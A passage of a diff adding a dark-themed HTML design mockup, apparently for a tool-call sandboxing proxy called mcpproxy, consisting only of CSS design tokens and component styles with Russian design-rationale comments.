@@ -1,0 +1,1359 @@
+<!doctype html>
+<html lang="ru" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<title>mcpproxy — E7 макет</title>
+<style>
+/* ═══════════════════════════════════════════════════════════════════════════
+   1. Токены. Семантические переменные и шкала red скопированы дословно из
+      packages/design/dist/css/tokens.css; шкалы green/amber/blue/violet
+      опущены — макет ходит через семантику и напрямую их не берёт.
+      Источник истины — src/tokens.ts; здесь зеркало ради самодостаточности.
+   ═══════════════════════════════════════════════════════════════════════ */
+:root {
+  --op-red-50:#FFF0F1; --op-red-100:#FFDDE0; --op-red-200:#FFBFC5; --op-red-300:#FF949E;
+  --op-red-400:#FF5568; --op-red-500:#FF1B2D; --op-red-600:#E00A1C; --op-red-700:#B80816;
+  --op-red-800:#920A15; --op-red-900:#740D16; --op-red-950:#400308;
+  --op-neutral-0:#FFFFFF; --op-neutral-25:#FBFBFC; --op-neutral-50:#F6F6F8;
+  --op-neutral-100:#EEEEF1; --op-neutral-200:#E0E0E5; --op-neutral-300:#C6C6CE;
+  --op-neutral-400:#9B9BA6; --op-neutral-500:#74747F; --op-neutral-600:#55555F;
+  --op-neutral-700:#3D3D46; --op-neutral-800:#2A2A31; --op-neutral-900:#1C1C21;
+  --op-neutral-950:#131317; --op-neutral-1000:#0A0A0C;
+
+  --font-sans: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+  --font-mono: "JetBrains Mono", ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+  --text-xs:0.6875rem; --text-sm:0.8125rem; --text-md:0.875rem;
+  --text-lg:1rem; --text-xl:1.25rem; --text-2xl:1.75rem;
+  --weight-regular:400; --weight-medium:500; --weight-semibold:600; --weight-bold:700;
+  --leading-tight:1.25; --leading-normal:1.5; --leading-relaxed:1.7;
+  --tracking-tight:-0.01em; --tracking-normal:0; --tracking-wide:0.04em; --tracking-eyebrow:0.08em;
+
+  --space-0:0; --space-1:2px; --space-2:4px; --space-3:6px; --space-4:8px; --space-5:12px;
+  --space-6:16px; --space-7:20px; --space-8:24px; --space-9:32px; --space-10:40px;
+  --space-11:48px; --space-12:64px;
+  --radius-none:0; --radius-sm:6px; --radius-md:10px; --radius-lg:14px; --radius-xl:20px; --radius-full:999px;
+  --shadow-none:none;
+  --shadow-sm:0 1px 2px rgba(10,10,12,.06), 0 1px 3px rgba(10,10,12,.10);
+  --shadow-md:0 2px 4px rgba(10,10,12,.06), 0 4px 12px rgba(10,10,12,.10);
+  --shadow-lg:0 4px 8px rgba(10,10,12,.08), 0 12px 32px rgba(10,10,12,.14);
+  --shadow-modal:0 8px 16px rgba(10,10,12,.12), 0 32px 64px rgba(10,10,12,.28);
+  --motion-instant:80ms; --motion-fast:120ms; --motion-normal:180ms; --motion-slow:240ms;
+  --motion-ease:cubic-bezier(.2,.8,.2,1); --motion-ease-in:cubic-bezier(.4,0,1,1);
+  --z-base:0; --z-sticky:100; --z-dropdown:200; --z-overlay:300; --z-approval:400; --z-toast:500;
+
+  --bg-app:#F6F6F8; --bg-surface:#FFFFFF; --bg-raised:#FFFFFF; --bg-sunken:#EEEEF1;
+  --bg-overlay:rgba(28,28,33,.40); --bg-hover:rgba(10,10,12,.04); --bg-active:rgba(10,10,12,.07);
+  --text-primary:#1C1C21; --text-secondary:#55555F; --text-tertiary:#74747F;
+  --text-inverse:#FFFFFF; --text-on-brand:#FFFFFF;
+  --border-subtle:rgba(10,10,12,.07); --border-default:rgba(10,10,12,.12);
+  --border-strong:rgba(10,10,12,.22); --border-focus:#E00A1C;
+  --brand:#FF1B2D; --brand-hover:#E00A1C; --brand-subtle:#FFF0F1; --brand-on-subtle:#B80816;
+  --state-ok:#087F5B; --state-ok-subtle:#E6FCF5;
+  --state-warn:#A15C07; --state-warn-subtle:#FFF9DB;
+  --state-danger:#B80816; --state-danger-subtle:#FFF0F1;
+  --state-info:#1560AC; --state-info-subtle:#E7F5FF;
+  --state-human:#5231B8; --state-human-subtle:#F3F0FF;
+  color-scheme: light dark;
+}
+@media (prefers-color-scheme: dark) { :root:not([data-theme='light']) {
+  --bg-app:#0A0A0C; --bg-surface:#131317; --bg-raised:#1C1C21; --bg-sunken:#070709;
+  --bg-overlay:rgba(10,10,12,.72); --bg-hover:rgba(255,255,255,.05); --bg-active:rgba(255,255,255,.09);
+  --text-primary:#F6F6F8; --text-secondary:#9B9BA6; --text-tertiary:#74747F;
+  --text-inverse:#0A0A0C; --text-on-brand:#FFFFFF;
+  --border-subtle:rgba(255,255,255,.07); --border-default:rgba(255,255,255,.12);
+  --border-strong:rgba(255,255,255,.20); --border-focus:#FF1B2D;
+  --brand:#FF1B2D; --brand-hover:#FF5568; --brand-subtle:rgba(255,27,45,.16); --brand-on-subtle:#FF949E;
+  --state-ok:#38D9A9; --state-ok-subtle:rgba(56,217,169,.14);
+  --state-warn:#FFB84D; --state-warn-subtle:rgba(255,184,77,.14);
+  --state-danger:#FF5568; --state-danger-subtle:rgba(255,85,104,.16);
+  --state-info:#74C0FC; --state-info-subtle:rgba(116,192,252,.14);
+  --state-human:#B197FC; --state-human-subtle:rgba(177,151,252,.14);
+} }
+:root[data-theme='dark'] {
+  --bg-app:#0A0A0C; --bg-surface:#131317; --bg-raised:#1C1C21; --bg-sunken:#070709;
+  --bg-overlay:rgba(10,10,12,.72); --bg-hover:rgba(255,255,255,.05); --bg-active:rgba(255,255,255,.09);
+  --text-primary:#F6F6F8; --text-secondary:#9B9BA6; --text-tertiary:#74747F;
+  --text-inverse:#0A0A0C; --text-on-brand:#FFFFFF;
+  --border-subtle:rgba(255,255,255,.07); --border-default:rgba(255,255,255,.12);
+  --border-strong:rgba(255,255,255,.20); --border-focus:#FF1B2D;
+  --brand:#FF1B2D; --brand-hover:#FF5568; --brand-subtle:rgba(255,27,45,.16); --brand-on-subtle:#FF949E;
+  --state-ok:#38D9A9; --state-ok-subtle:rgba(56,217,169,.14);
+  --state-warn:#FFB84D; --state-warn-subtle:rgba(255,184,77,.14);
+  --state-danger:#FF5568; --state-danger-subtle:rgba(255,85,104,.16);
+  --state-info:#74C0FC; --state-info-subtle:rgba(116,192,252,.14);
+  --state-human:#B197FC; --state-human-subtle:rgba(177,151,252,.14);
+}
+:root[data-theme='light'] {
+  --bg-app:#F6F6F8; --bg-surface:#FFFFFF; --bg-raised:#FFFFFF; --bg-sunken:#EEEEF1;
+  --bg-overlay:rgba(28,28,33,.40); --bg-hover:rgba(10,10,12,.04); --bg-active:rgba(10,10,12,.07);
+  --text-primary:#1C1C21; --text-secondary:#55555F; --text-tertiary:#74747F;
+  --text-inverse:#FFFFFF; --text-on-brand:#FFFFFF;
+  --border-subtle:rgba(10,10,12,.07); --border-default:rgba(10,10,12,.12);
+  --border-strong:rgba(10,10,12,.22); --border-focus:#E00A1C;
+  --brand:#FF1B2D; --brand-hover:#E00A1C; --brand-subtle:#FFF0F1; --brand-on-subtle:#B80816;
+  --state-ok:#087F5B; --state-ok-subtle:#E6FCF5;
+  --state-warn:#A15C07; --state-warn-subtle:#FFF9DB;
+  --state-danger:#B80816; --state-danger-subtle:#FFF0F1;
+  --state-info:#1560AC; --state-info-subtle:#E7F5FF;
+  --state-human:#5231B8; --state-human-subtle:#F3F0FF;
+}
+
+/* ═══ 2. Сброс и база — дословно из packages/design/src/css ═══════════════ */
+*,*::before,*::after{box-sizing:border-box}
+*{margin:0}
+html,body,#root{height:100%}
+body{-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;
+  background:var(--bg-app);color:var(--text-primary);font-family:var(--font-sans);
+  font-size:var(--text-md);line-height:var(--leading-normal)}
+img,picture,video,canvas,svg{display:block;max-width:100%}
+input,button,textarea,select{font:inherit;color:inherit}
+p,h1,h2,h3,h4,h5,h6{overflow-wrap:break-word}
+button{background:none;border:none;padding:0;cursor:pointer}
+@media (prefers-reduced-motion:reduce){*,*::before,*::after{
+  animation-duration:.01ms!important;animation-iteration-count:1!important;
+  transition-duration:.01ms!important;scroll-behavior:auto!important}}
+
+:focus-visible{outline:2px solid var(--border-focus);outline-offset:2px;border-radius:var(--radius-sm)}
+:focus:not(:focus-visible){outline:none}
+code,kbd,samp,pre,.mono{font-family:var(--font-mono);font-size:0.9em;font-variant-ligatures:none}
+pre,.argv{overflow-x:auto;white-space:pre;tab-size:2}
+.eyebrow{font-size:var(--text-xs);font-weight:var(--weight-semibold);
+  letter-spacing:var(--tracking-eyebrow);text-transform:uppercase;color:var(--text-tertiary)}
+.surface{background:var(--bg-surface);border:1px solid var(--border-subtle);border-radius:var(--radius-lg)}
+.raised{background:var(--bg-raised);border:1px solid var(--border-default);
+  border-radius:var(--radius-lg);box-shadow:var(--shadow-md)}
+.badge{display:inline-flex;align-items:center;gap:var(--space-3);
+  padding:var(--space-1) var(--space-4);border-radius:var(--radius-full);
+  font-size:var(--text-xs);font-weight:var(--weight-medium);white-space:nowrap}
+.badge--ok{color:var(--state-ok);background:var(--state-ok-subtle)}
+.badge--warn{color:var(--state-warn);background:var(--state-warn-subtle)}
+.badge--danger{color:var(--state-danger);background:var(--state-danger-subtle)}
+.badge--info{color:var(--state-info);background:var(--state-info-subtle)}
+.badge--human{color:var(--state-human);background:var(--state-human-subtle)}
+.badge--muted{color:var(--text-tertiary);background:var(--bg-hover)}
+.btn-primary{background:var(--text-primary);color:var(--text-inverse);
+  padding:var(--space-4) var(--space-7);border-radius:var(--radius-md);
+  font-weight:var(--weight-medium);transition:opacity var(--motion-fast) var(--motion-ease)}
+.btn-primary:hover{opacity:.88}
+.btn-primary:disabled,.btn-danger:disabled{background:var(--bg-hover);
+  color:var(--text-tertiary);border:1px solid var(--border-default);
+  cursor:not-allowed;opacity:1}
+.btn-secondary{background:transparent;color:var(--text-primary);border:1px solid var(--border-default);
+  padding:var(--space-4) var(--space-7);border-radius:var(--radius-md);
+  font-weight:var(--weight-medium);transition:background var(--motion-fast) var(--motion-ease)}
+.btn-secondary:hover{background:var(--bg-hover)}
+.btn-danger{background:var(--brand);color:var(--text-on-brand);
+  padding:var(--space-4) var(--space-7);border-radius:var(--radius-md);
+  font-weight:var(--weight-semibold);transition:background var(--motion-fast) var(--motion-ease)}
+.btn-danger:hover{background:var(--brand-hover)}
+.unsandboxed-banner{background:var(--state-danger-subtle);color:var(--state-danger);
+  border-bottom:1px solid var(--state-danger);padding:var(--space-4) var(--space-6);
+  font-weight:var(--weight-semibold);font-size:var(--text-sm);text-align:center}
+/* Светлая тема: приглушённый розовый читается как декор, а не как тревога.
+   README: baseline не должен ни секунды выглядеть как обычная работа. */
+:root[data-theme='light'] .unsandboxed-banner,
+:root:not([data-theme='dark']) .unsandboxed-banner{
+  background:var(--op-red-600);color:var(--text-on-brand);border-bottom-color:var(--op-red-700)}
+@media (prefers-color-scheme:dark){:root:not([data-theme='light']) .unsandboxed-banner{
+  background:var(--state-danger-subtle);color:var(--state-danger);border-bottom-color:var(--state-danger)}}
+
+/* ═══ 3. Оболочка макета (снимается через ?mode=raw) ═════════════════════ */
+.mock-bar{position:fixed;top:0;left:0;right:0;z-index:600;display:flex;gap:var(--space-5);
+  align-items:center;padding:var(--space-4) var(--space-6);background:var(--bg-sunken);
+  border-bottom:1px solid var(--border-default);font-size:var(--text-sm)}
+.mock-bar select{background:var(--bg-surface);color:var(--text-primary);
+  border:1px solid var(--border-default);border-radius:var(--radius-sm);padding:var(--space-2) var(--space-4)}
+.mock-bar .spacer{flex:1}
+.mock-note{color:var(--text-tertiary);font-size:var(--text-xs)}
+body.raw .mock-bar{display:none}
+body:not(.raw) #app{margin-top:45px}
+
+/* ═══ 4. Каркас приложения ══════════════════════════════════════════════ */
+#app{height:100%;display:flex;flex-direction:column;overflow:hidden}
+.chrome{display:flex;align-items:center;gap:var(--space-6);padding:var(--space-5) var(--space-7);
+  border-bottom:1px solid var(--border-subtle);background:var(--bg-surface);flex:none}
+.logo{display:flex;align-items:center;gap:var(--space-4);font-weight:var(--weight-bold);
+  letter-spacing:var(--tracking-tight);font-size:var(--text-lg)}
+.logo .mark{width:18px;height:18px;border-radius:var(--radius-full);
+  background:var(--brand);flex:none}
+.chrome .spacer{flex:1}
+
+/* Переключатель режима песочницы — сегментированный, не выпадающий:
+   на сцене нужен один клик и видимое текущее положение. */
+.modeswitch{display:inline-flex;border:1px solid var(--border-default);
+  border-radius:var(--radius-full);overflow:hidden}
+.modeswitch button{padding:var(--space-3) var(--space-6);font-size:var(--text-sm);
+  font-weight:var(--weight-medium);color:var(--text-secondary);
+  transition:background var(--motion-fast) var(--motion-ease)}
+.modeswitch button + button{border-left:1px solid var(--border-default)}
+.modeswitch button:hover{background:var(--bg-hover)}
+.modeswitch button[aria-pressed="true"]{background:var(--bg-active);color:var(--text-primary)}
+.modeswitch button[aria-pressed="true"][data-mode="none"]{
+  background:var(--state-danger-subtle);color:var(--state-danger)}
+
+.body{flex:1;display:flex;min-height:0}
+.nav{width:196px;flex:none;border-right:1px solid var(--border-subtle);
+  padding:var(--space-6) var(--space-4);display:flex;flex-direction:column;gap:var(--space-1);
+  background:var(--bg-surface)}
+.nav button{display:flex;align-items:center;gap:var(--space-4);width:100%;text-align:left;
+  padding:var(--space-4) var(--space-5);border-radius:var(--radius-md);
+  color:var(--text-secondary);font-size:var(--text-md);font-weight:var(--weight-medium);
+  transition:background var(--motion-fast) var(--motion-ease)}
+.nav button:hover{background:var(--bg-hover)}
+.nav button[aria-current="page"]{background:var(--bg-active);color:var(--text-primary)}
+/* Брендовый красный как индикатор активной навигации — одно из трёх
+   разрешённых мест (README дизайн-системы). */
+.nav button[aria-current="page"]::before{content:"";width:3px;align-self:stretch;
+  background:var(--brand);border-radius:var(--radius-full);margin-left:calc(var(--space-5) * -1)}
+.nav .count{margin-left:auto;font-size:var(--text-xs);color:var(--text-tertiary);
+  font-variant-numeric:tabular-nums}
+.nav-sep{height:1px;background:var(--border-subtle);margin:var(--space-5) var(--space-4)}
+
+.main{flex:1;min-width:0;display:flex}
+.pane{min-width:0;display:flex;flex-direction:column}
+.pane-list{flex:1.15;border-right:1px solid var(--border-subtle)}
+.pane-detail{flex:1;background:var(--bg-surface)}
+.pane-head{display:flex;align-items:center;gap:var(--space-5);padding:var(--space-6) var(--space-7);
+  border-bottom:1px solid var(--border-subtle);flex:none}
+.pane-head h2{font-size:var(--text-md);font-weight:var(--weight-semibold)}
+.pane-head .spacer{flex:1}
+.pane-scroll{flex:1;overflow-y:auto;min-height:0}
+
+/* ═══ 5. Список вызовов ═════════════════════════════════════════════════ */
+.call{display:block;width:100%;text-align:left;padding:var(--space-5) var(--space-7);
+  border-bottom:1px solid var(--border-subtle);border-left:3px solid transparent;
+  transition:background var(--motion-fast) var(--motion-ease)}
+.call:hover{background:var(--bg-hover)}
+.call[aria-selected="true"]{background:var(--bg-active)}
+.call.role-warn{border-left-color:var(--state-warn)}
+.call.role-danger{border-left-color:var(--state-danger)}
+.call.role-info{border-left-color:var(--state-info)}
+.call-top{display:flex;align-items:center;gap:var(--space-4);margin-bottom:var(--space-3)}
+.call-name{font-weight:var(--weight-semibold);font-size:var(--text-md)}
+.call-time{margin-left:auto;font-size:var(--text-xs);color:var(--text-secondary);
+  font-variant-numeric:tabular-nums}
+/* Слово диспозиции идёт первым: оно переживает усечение и читается
+   скринридером раньше цвета. */
+.call-line{font-size:var(--text-sm);color:var(--text-secondary);
+  display:flex;gap:var(--space-3);align-items:baseline}
+.call-icon{flex:none;font-weight:var(--weight-bold);width:12px;text-align:center}
+.call-line.role-warn .call-icon{color:var(--state-warn)}
+.call-line.role-danger .call-icon{color:var(--state-danger)}
+.call-line.role-ok .call-icon{color:var(--state-ok)}
+.call-line.role-info .call-icon{color:var(--state-info)}
+.call-line b{font-weight:var(--weight-semibold);flex:none}
+.call-line.role-warn b{color:var(--state-warn)}
+.call-line.role-danger b{color:var(--state-danger)}
+.call-line.role-ok b{color:var(--state-ok)}
+.call-line.role-info b{color:var(--state-info)}
+.call-line span{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+
+/* Свёрнутая полоса из трёх групп — двухуровневый зум, как в DevTools.
+   Не случившиеся стадии не рисуются вовсе: их нет в событии. */
+.groupbar{display:flex;gap:var(--space-3);margin-top:var(--space-4);height:4px}
+.groupbar .grp{display:flex;gap:0}
+.groupbar .grp i + i{margin-left:1px}
+.groupbar i{display:block;border-radius:var(--radius-full);background:var(--border-strong)}
+.groupbar i.g-ok{background:var(--state-ok)}
+.groupbar i.g-warn{background:var(--state-warn)}
+.groupbar i.g-danger{background:var(--state-danger)}
+.groupbar i.g-info{background:var(--state-info)}
+.groupbar i.g-skip{background:var(--border-subtle)}
+
+/* Две соседние строки S5 — один и тот же вызов в двух режимах. Без явной
+   связи зал догадывается об этом сам, а на 90 секунд догадок нет. */
+.pairnote{display:block;margin-top:var(--space-3);font-size:var(--text-xs);
+  color:var(--text-secondary);font-style:italic}
+.pending{padding:var(--space-6) var(--space-7);border-bottom:1px solid var(--border-subtle);
+  border-left:3px solid var(--state-info)}
+.pending-top{display:flex;align-items:center;gap:var(--space-5);margin-bottom:var(--space-5)}
+.pending-foot{display:flex;align-items:center;gap:var(--space-5);margin-top:var(--space-5)}
+.pending-foot .spacer{flex:1}
+.empty{padding:var(--space-11) var(--space-7);text-align:center;color:var(--text-tertiary)}
+.empty b{display:block;color:var(--text-secondary);font-weight:var(--weight-semibold);
+  margin-bottom:var(--space-3);font-size:var(--text-md)}
+.skel{display:inline-block;height:10px;vertical-align:middle;
+  border-radius:var(--radius-full);background:var(--border-default);
+  animation:pulse 1.4s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:.55}50%{opacity:1}}
+
+/* ═══ 6. Панель деталей ═════════════════════════════════════════════════ */
+.detail-scroll{flex:1;overflow-y:auto;min-height:0;padding:var(--space-7)}
+.dsec{margin-bottom:var(--space-9)}
+.dsec > .eyebrow{margin-bottom:var(--space-5);display:block}
+.kv{display:grid;grid-template-columns:132px 1fr;gap:var(--space-4) var(--space-6);
+  font-size:var(--text-sm)}
+.kv dt{color:var(--text-tertiary)}
+.kv dd{min-width:0}
+/* Каждое поле деталей — фильтр по списку (приём Little Snitch). */
+.chipfilter{font-family:var(--font-mono);font-size:0.9em;background:var(--bg-hover);
+  border:1px solid var(--border-subtle);border-radius:var(--radius-sm);
+  padding:1px var(--space-3);cursor:pointer;text-align:left;max-width:100%;
+  overflow-x:auto;white-space:pre}
+.chipfilter:hover{border-color:var(--border-strong);background:var(--bg-active)}
+
+.denybox{display:flex;flex-direction:column;gap:var(--space-3);
+  padding:var(--space-6);margin-bottom:var(--space-9);
+  border:1px solid var(--state-warn);border-left-width:3px;
+  border-radius:var(--radius-md);background:var(--state-warn-subtle)}
+.deny-verb{font-weight:var(--weight-semibold);color:var(--state-warn);font-size:var(--text-md)}
+.deny-why{font-size:var(--text-sm)}
+.deny-note{font-size:var(--text-sm);color:var(--text-secondary)}
+.argvbox{background:var(--bg-sunken);border:1px solid var(--border-subtle);
+  border-radius:var(--radius-md);padding:var(--space-5) var(--space-6);
+  font-family:var(--font-mono);font-size:var(--text-sm);white-space:pre;overflow-x:auto}
+.argvbox .arg{display:inline-block;padding:0 var(--space-2);border-radius:var(--radius-sm)}
+.argvbox .arg-param{background:var(--bg-active);
+  box-shadow:inset 0 0 0 1px var(--border-strong)}
+.argv-legend,.argv-none{font-size:var(--text-sm);color:var(--text-secondary);
+  margin-top:var(--space-4)}
+.argvlist{background:var(--bg-sunken);border:1px solid var(--border-subtle);
+  border-radius:var(--radius-md);padding:var(--space-5) var(--space-6);
+  display:grid;grid-template-columns:auto 1fr;gap:var(--space-2) var(--space-5);
+  font-family:var(--font-mono);font-size:var(--text-md)}
+.argvlist .i{color:var(--text-secondary);font-size:var(--text-xs);
+  font-variant-numeric:tabular-nums;text-align:right}
+.argvlist .v{word-break:break-all}
+.argvlist .v.tok{background:var(--bg-active);
+  box-shadow:inset 0 0 0 1px var(--border-strong);border-radius:var(--radius-sm);
+  padding:0 var(--space-3);justify-self:start}
+
+/* Стадии: строка = подпись + длительность + деталь. Левая линейка вместо
+   заливки — янтарь и красный не добирают контраста под текстом (Felt 2015). */
+.stages{display:flex;flex-direction:column}
+.stage{display:grid;grid-template-columns:20px 152px 62px 1fr;gap:var(--space-4);
+  align-items:baseline;padding:var(--space-4) var(--space-4);border-radius:var(--radius-sm);
+  border-left:3px solid transparent;font-size:var(--text-sm)}
+.stage + .stage{border-top:1px solid var(--border-subtle)}
+.stage.role-warn{border-left-color:var(--state-warn);background:var(--state-warn-subtle)}
+.stage.role-danger{border-left-color:var(--state-danger);background:var(--state-danger-subtle)}
+.stage.role-info{border-left-color:var(--state-info);background:var(--state-info-subtle)}
+.stage-icon{font-size:var(--text-sm);line-height:1;text-align:center;font-weight:var(--weight-bold)}
+.stage.role-warn .stage-icon{color:var(--state-warn)}
+.stage.role-danger .stage-icon{color:var(--state-danger)}
+.stage.role-ok .stage-icon{color:var(--state-ok)}
+.stage.role-info .stage-icon{color:var(--state-info)}
+.stage-name{font-weight:var(--weight-medium)}
+.stage-ms{font-variant-numeric:tabular-nums;text-align:right;color:var(--text-secondary);
+  font-family:var(--font-mono);font-size:var(--text-xs)}
+.stage-detail{color:var(--text-secondary);min-width:0}
+.stage-detail .mono{white-space:pre;overflow-x:auto;max-width:100%;display:inline-block;
+  vertical-align:bottom}
+.nowrap{white-space:pre}
+.stage-absent{padding:var(--space-4);font-size:var(--text-xs);color:var(--text-secondary);
+  border-top:1px dashed var(--border-subtle);margin-top:var(--space-2)}
+
+.overhead{display:flex;align-items:baseline;gap:var(--space-4);padding:var(--space-5) var(--space-6);
+  background:var(--bg-sunken);border-radius:var(--radius-md);margin-top:var(--space-6)}
+.overhead b{font-size:var(--text-xl);font-variant-numeric:tabular-nums;font-family:var(--font-mono)}
+.overhead span{font-size:var(--text-xs);color:var(--text-tertiary)}
+
+/* ═══ 7. Нарушения ══════════════════════════════════════════════════════ */
+.vrow{display:grid;grid-template-columns:20px 108px 1fr auto;gap:var(--space-5);
+  align-items:baseline;padding:var(--space-5) var(--space-7);
+  border-bottom:1px solid var(--border-subtle);border-left:3px solid transparent}
+.vrow > .badge{justify-self:start}
+.vrow.role-warn{border-left-color:var(--state-warn)}
+.vrow.role-danger{border-left-color:var(--state-danger)}
+.vrow-icon{text-align:center;font-weight:var(--weight-bold)}
+.vrow.role-warn .vrow-icon{color:var(--state-warn)}
+.vrow.role-danger .vrow-icon{color:var(--state-danger)}
+.vrow-what{min-width:0}
+.vrow-what b{display:block;font-weight:var(--weight-semibold);font-size:var(--text-sm)}
+.vrow.role-warn .vrow-what b{color:var(--state-warn)}
+.vrow.role-danger .vrow-what b{color:var(--state-danger)}
+.vrow-what .mono{font-size:var(--text-sm);color:var(--text-secondary);
+  display:block;overflow-x:auto;white-space:pre}
+.vrow-meta{font-size:var(--text-xs);color:var(--text-secondary);text-align:right;
+  font-variant-numeric:tabular-nums;white-space:nowrap}
+
+/* ═══ 8. Политика ═══════════════════════════════════════════════════════ */
+.tool{padding:var(--space-6) var(--space-7);border-bottom:1px solid var(--border-subtle)}
+.tool-top{display:flex;align-items:center;gap:var(--space-5);margin-bottom:var(--space-4)}
+.tool-name{font-family:var(--font-mono);font-weight:var(--weight-semibold);font-size:var(--text-md)}
+.tool-sentence{font-size:var(--text-sm);color:var(--text-secondary);margin-bottom:var(--space-5)}
+.tool-badges{display:flex;flex-wrap:wrap;gap:var(--space-3);margin-bottom:var(--space-4)}
+/* Регистры сравнимы только на одних осях. «exec-строка» против «чтение,
+   запись, сеть» — две разные вещи в одной таблице, сравнивать нечего. */
+.register{display:grid;grid-template-columns:auto 1fr 1fr;
+  gap:var(--space-3) var(--space-6);font-size:var(--text-sm);align-items:baseline;
+  padding:var(--space-5) var(--space-6);background:var(--bg-sunken);
+  border-radius:var(--radius-md);margin-bottom:var(--space-4)}
+.register .axis{color:var(--text-secondary);white-space:nowrap}
+.register .claimed.diverges{color:var(--state-warn);font-weight:var(--weight-medium)}
+.register .enforced{color:var(--text-primary)}
+.claimwarn{font-size:var(--text-xs);color:var(--state-warn);margin-top:var(--space-4);
+  display:flex;gap:var(--space-3)}
+.weakened{font-size:var(--text-xs);color:var(--state-warn);
+  border:1px solid var(--state-warn);border-radius:var(--radius-sm);
+  padding:0 var(--space-3);white-space:nowrap}
+
+/* ═══ 9. Аудит ══════════════════════════════════════════════════════════ */
+.chainbox{margin:var(--space-7);padding:var(--space-6) var(--space-7);
+  border:1px solid var(--border-default);border-radius:var(--radius-lg);background:var(--bg-surface)}
+.chainbox.broken{border-color:var(--state-danger);background:var(--state-danger-subtle)}
+.chain-head{display:flex;align-items:baseline;gap:var(--space-5);margin-bottom:var(--space-5)}
+.chain-claim{font-weight:var(--weight-semibold);font-size:var(--text-md)}
+.chain-caveat{font-size:var(--text-sm);color:var(--text-primary);
+  margin-bottom:var(--space-5)}
+.chainbox.broken .chain-claim{color:var(--state-danger)}
+.chain-anchor{font-size:var(--text-sm);color:var(--text-secondary)}
+.checklist{list-style:none;font-size:var(--text-sm);color:var(--text-secondary);
+  display:flex;flex-direction:column;gap:var(--space-3)}
+.checklist li{display:flex;gap:var(--space-4);align-items:baseline}
+.checklist .m{font-family:var(--font-mono);font-size:var(--text-xs);flex:none;width:14px}
+.checklist .ok{color:var(--state-ok)}
+.checklist .no{color:var(--state-danger)}
+.checklist .na{color:var(--text-tertiary)}
+.blast{margin-top:var(--space-5);padding-top:var(--space-5);
+  border-top:1px solid var(--border-subtle);font-size:var(--text-sm);color:var(--state-danger)}
+.entry{display:grid;grid-template-columns:64px 1fr auto;gap:var(--space-5);
+  padding:var(--space-4) var(--space-7);border-bottom:1px solid var(--border-subtle);
+  font-size:var(--text-sm);align-items:baseline;border-left:3px solid transparent}
+.entry.at-break{border-left-color:var(--state-danger);background:var(--state-danger-subtle)}
+.entry.beyond{border-left-color:var(--border-strong);
+  background:repeating-linear-gradient(135deg,transparent 0 6px,var(--bg-hover) 6px 12px)}
+.entry-at{color:var(--text-secondary);font-size:var(--text-xs)}
+.break-tag{color:var(--state-danger);font-size:var(--text-xs);
+  font-weight:var(--weight-semibold);margin-left:var(--space-4)}
+.beyond-tag{color:var(--text-secondary);font-size:var(--text-xs);margin-left:var(--space-4)}
+.beyond-note{padding:var(--space-5) var(--space-7);font-size:var(--text-sm);
+  color:var(--text-secondary)}
+.entry .n{font-family:var(--font-mono);font-size:var(--text-xs);color:var(--text-tertiary);
+  font-variant-numeric:tabular-nums}
+.entry .h{font-family:var(--font-mono);font-size:var(--text-xs);color:var(--text-secondary);
+  overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+
+/* ═══ 10. Модалка диффа lock ════════════════════════════════════════════ */
+.overlay{position:fixed;inset:0;background:var(--bg-overlay);z-index:var(--z-overlay);
+  display:flex;align-items:center;justify-content:center;padding:var(--space-9)}
+.modal{background:var(--bg-raised);border:1px solid var(--border-default);
+  border-radius:var(--radius-lg);box-shadow:var(--shadow-modal);
+  width:min(760px,100%);max-height:100%;display:flex;flex-direction:column}
+.modal-head{padding:var(--space-7);border-bottom:1px solid var(--border-subtle)}
+.modal-head h2{font-size:var(--text-xl);font-weight:var(--weight-semibold);margin-bottom:var(--space-3)}
+.modal-head p{font-size:var(--text-sm);color:var(--text-secondary)}
+.modal-body{padding:var(--space-7);overflow-y:auto;min-height:0}
+.modal-foot{padding:var(--space-6) var(--space-7);border-top:1px solid var(--border-subtle);
+  display:flex;gap:var(--space-5);align-items:center}
+.modal-foot .spacer{flex:1}
+.slot{margin-bottom:var(--space-7)}
+.slot > .eyebrow{display:block;margin-bottom:var(--space-4)}
+.slot-empty{font-size:var(--text-sm);color:var(--text-tertiary)}
+.diff{font-family:var(--font-mono);font-size:var(--text-sm);border-radius:var(--radius-md);
+  overflow:hidden;border:1px solid var(--border-subtle)}
+.diff div{padding:var(--space-2) var(--space-5);white-space:pre;overflow-x:auto}
+/* Роли состояний здесь не тратятся: зелёное «прошло штатно» на строке,
+   из-за которой рецепт и заблокирован, — прямая ложь. Различают маркеры. */
+.diff .was{background:var(--bg-sunken);color:var(--text-secondary)}
+.diff .is{background:var(--bg-active);color:var(--text-primary);
+  box-shadow:inset 3px 0 0 var(--border-strong)}
+.diff .m{display:inline-block;width:1.2em;color:var(--text-secondary);
+  font-weight:var(--weight-bold)}
+
+/* ═══ 11. Окно апрува — отдельное окно ОС, не модалка внутри приложения ══ */
+.winshade{position:fixed;inset:0;background:var(--bg-overlay);z-index:var(--z-approval);
+  display:flex;align-items:center;justify-content:center;padding:var(--space-9)}
+.win{width:min(620px,100%);background:var(--bg-raised);border:1px solid var(--border-default);
+  border-radius:var(--radius-lg);box-shadow:var(--shadow-modal);display:flex;flex-direction:column;
+  max-height:100%}
+.win-title{display:flex;align-items:center;gap:var(--space-4);padding:var(--space-4) var(--space-6);
+  border-bottom:1px solid var(--border-subtle);font-size:var(--text-xs);color:var(--text-tertiary)}
+.win-title .dots{display:flex;gap:var(--space-3)}
+.win-title .dots i{width:10px;height:10px;border-radius:var(--radius-full);
+  background:var(--border-strong);display:block}
+.win-body{padding:var(--space-7);overflow-y:auto;min-height:0}
+.win h2{font-size:var(--text-xl);font-weight:var(--weight-semibold);margin-bottom:var(--space-4)}
+.win-why{font-size:var(--text-sm);color:var(--text-secondary);margin-bottom:var(--space-7)}
+.confirm{margin-top:var(--space-7);padding-top:var(--space-6);border-top:1px solid var(--border-subtle)}
+.confirm label{display:block;font-size:var(--text-sm);margin-bottom:var(--space-4)}
+.confirm input{width:100%;padding:var(--space-4) var(--space-5);border-radius:var(--radius-md);
+  border:1px solid var(--border-default);background:var(--bg-sunken);
+  font-family:var(--font-mono);font-size:var(--text-md)}
